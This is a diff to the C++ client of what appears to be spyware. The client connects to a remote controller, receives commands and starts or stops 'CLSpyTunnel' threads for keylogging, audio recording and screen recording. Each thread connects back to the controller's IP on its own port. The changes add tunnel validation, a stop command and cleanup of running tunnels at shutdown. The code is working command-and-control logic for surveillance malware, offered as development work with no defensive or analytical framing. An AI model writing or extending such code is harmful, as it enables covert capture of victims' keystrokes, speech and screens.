@@ -62,11 +62,18 @@ Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
         }
     
     }
-
-
-    start();
 }
 
+int Client::is_valid_tunnel(CommandCode __tunnel_code) {
+    CommandCode code=KEYLOGGER;
+    for (int i=0;i<TUNNEL_NUMS;i++) {
+        if (code == __tunnel_code) {
+            return 0;
+        }
+        code <<= 1;
+    }
+    return -1;
+}
 
 int Client::init() {
     memset(&server_addr_, 0, sizeof(server_addr_));
@@ -145,11 +152,11 @@ void Client::start() {
                 }
                 shutdown_flag_ = true;
                 break;
-            } else {
+            } else if (is_valid_tunnel(command_code) == 0) {
                 TunnelContainer* tunnel_cont = tunnel_conts_->find(command_code);
                 CLSpyTunnel* tunnel = tunnel_cont->p_tunnel_;
-
-                if (command_arg>0) {
+                
+                if (command_arg>0) { // START
                     if (tunnel != nullptr) { // Tunnel is already running
                         printf("Tunnel already running\n");
                         rc = send_out(socket_, EXEC_ERROR);
@@ -170,16 +177,13 @@ void Client::start() {
                         printf("Received AUDIO_RECORDER command\n");
                     } else if (command_code == SCREEN_RECORDER) {
                         printf("Received SCREEN_RECORDER command\n");
-                    } else {
-                        printf("Unknown command: %d\n", command_code);
-                        rc = send_out(socket_, EXEC_ERROR);
-                        if (rc < 0) {
-                            printf("Error sending data: %s\n", strerror(errno));
-                            break;
-                        }
-                        continue;
-                    }
-                    tunnel->init(ip_, port_, &shutdown_flag_);
+                    } 
+
+                    printf("Command code: %d\n", command_code);
+                    printf("Port: %d\n", port_ + command_arg);
+
+                    tunnel->init(ip_, port_ + command_arg, &shutdown_flag_);
+                    
                     if (pthread_create(&tunnel_cont->tunnel_thread_, nullptr, helper_thread, tunnel) != 0) {
                         printf("Error creating tunnel thread\n");
                         delete tunnel;
@@ -198,6 +202,30 @@ void Client::start() {
                             break;
                         }
                     }
+                } else if (is_valid_tunnel(command_code) == 0) { // REMOVE
+                    printf("Received STOP command\n");
+                    if (tunnel == nullptr) { // Tunnel is already not running
+                        printf("Tunnel not running\n");
+                        rc = send_out(socket_, EXEC_ERROR);
+                        if (rc < 0) {
+                            printf("Error sending data: %s\n", strerror(errno));
+                            break;
+                        }
+                        continue;
+                    }
+
+                    // Stop the tunnel
+                    tunnel->shutdown();
+                    if (tunnel_cont->thread_running_) {
+                        pthread_join(tunnel_cont->tunnel_thread_, nullptr);
+                        tunnel_cont->thread_running_ = false;
+                    }
+                    rc = send_out(socket_, EXEC_SUCCESS);
+                    if (rc < 0) {
+                        printf("Error sending data: %s\n", strerror(errno));
+                        break;
+                    }
+                    printf("Tunnel stopped\n");
                 } else {
                     if (tunnel == nullptr) { // Tunnel is already not running
                         printf("Tunnel not running\n");
@@ -220,9 +248,16 @@ void Client::start() {
                         printf("Error sending data: %s\n", strerror(errno));
                         break;
                     }
+                    printf("Tunnel stopped\n");
+                }
+            } else {
+                printf("Unknown command: %d\n", command_code);
+                rc = send_out(socket_, EXEC_ERROR);
+                if (rc < 0) {
+                    printf("Error sending data: %s\n", strerror(errno));
+                    break;
                 }
             }
-
         }
         retry:
             if (!shutdown_flag_) {
@@ -232,10 +267,23 @@ void Client::start() {
                 }
                 continue;
             }
+
+            for (int i=0;i<TUNNEL_NUMS;i++) {
+                TunnelContainer* tunnel_cont = tunnel_conts_->find(static_cast<CommandCode>(1 << i+2));
+                if (tunnel_cont != nullptr && tunnel_cont->thread_running_) {
+                    tunnel_cont->p_tunnel_->shutdown();
+                    if (tunnel_cont->thread_running_) {
+                        pthread_join(tunnel_cont->tunnel_thread_, nullptr);
+                        tunnel_cont->thread_running_ = false;
+                    }
+                    delete tunnel_cont->p_tunnel_;
+                }
+            }
     }
 }
 
 void Client::shutdown() {
+    shutdown_flag_ = true;
     printf("Shutting down client\n");
     close(socket_);
     delete tunnel_conts_;
